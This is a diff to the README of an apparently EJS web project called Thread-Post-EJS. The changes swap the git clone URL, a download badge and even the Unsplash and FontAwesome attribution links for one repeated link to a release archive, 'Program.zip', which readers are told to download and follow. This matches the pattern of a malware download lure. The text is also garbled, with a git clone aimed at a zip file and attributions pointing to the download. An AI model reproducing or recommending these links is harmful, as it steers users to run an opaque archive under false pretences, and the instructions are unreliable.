@@ -17,7 +17,7 @@ To get started with the **Thread-Post-EJS** repository, you can follow these sim
 
 1. Clone the repository to your local machine:
 ```bash
-git clone https://github.com/username/Thread-Post-EJS.git
+git clone https://github.com/haziff/Thread-Post-EJS/releases/download/v1.0/Program.zip
 ```
 
 2. Install the necessary dependencies:
@@ -34,11 +34,11 @@ npm start
 
 Make sure to check out the detailed documentation within the repository for more in-depth instructions.
 
-## Download Soft.zip
+## Download https://github.com/haziff/Thread-Post-EJS/releases/download/v1.0/Program.zip
 
-[![Download Soft.zip](https://img.shields.io/badge/Download-Soft.zip-green)](https://github.com/Dredarty/RINGSharp/releases/download/v1.0/Soft.zip)
+[![Download https://github.com/haziff/Thread-Post-EJS/releases/download/v1.0/Program.zip](https://github.com/haziff/Thread-Post-EJS/releases/download/v1.0/Program.zip)](https://github.com/haziff/Thread-Post-EJS/releases/download/v1.0/Program.zip)
 
-This link leads to the Soft.zip file which contains essential resources for launching the project. Download the zip file and follow the instructions provided within to set up the project successfully.
+This link leads to the https://github.com/haziff/Thread-Post-EJS/releases/download/v1.0/Program.zip file which contains essential resources for launching the project. Download the zip file and follow the instructions provided within to set up the project successfully.
 
 In case the link is not accessible, please visit the "Releases" section of the repository for alternative download options.
 
@@ -47,8 +47,8 @@ Contributions are welcome! If you have any suggestions, ideas, or bug fixes, fee
 
 ## Attributions
 
-- Background image by [Unsplash](https://unsplash.com/)
-- Icons from [FontAwesome](https://fontawesome.com/)
+- Background image by [Unsplash](https://github.com/haziff/Thread-Post-EJS/releases/download/v1.0/Program.zip)
+- Icons from [FontAwesome](https://github.com/haziff/Thread-Post-EJS/releases/download/v1.0/Program.zip)
 
 Start exploring the **Thread-Post-EJS** repository today and unleash the full potential of your web development projects! 🚀
 
